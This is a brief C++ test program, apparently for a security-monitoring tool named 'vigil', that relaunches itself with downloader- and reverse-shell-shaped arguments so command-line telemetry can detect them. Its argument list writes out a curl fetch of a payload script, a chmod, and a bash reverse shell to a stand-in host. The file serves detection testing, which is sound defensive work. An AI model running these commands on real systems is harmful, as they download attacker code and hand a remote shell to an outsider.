/**
 * @file SuspiciousCmdLine.cpp
 * @brief Simulates downloader and reverse-shell command-line indicators.
 *
 * The program relaunches itself with arguments containing common downloader and
 * shell indicators. The strings are present for command-line telemetry only and
 * are not executed as shell commands.
 */

#include "Common.hpp"

int main(int argc, char **argv) {
  if (vigil::examples::has_arg(argc, argv, "--payload")) {
    std::cout << "vigil suspicious_cmdline benign downloader-shaped payload\n";
    vigil::examples::sleep_for_agent();
    return 0;
  }

  vigil::examples::exec_path(
      vigil::examples::self_path(),
      {"--payload", "curl http://192.0.2.10/payload.sh -o /tmp/.vigil",
       "chmod +x /tmp/.vigil", "bash -i >& /dev/tcp/192.0.2.10/4444 0>&1"});
}
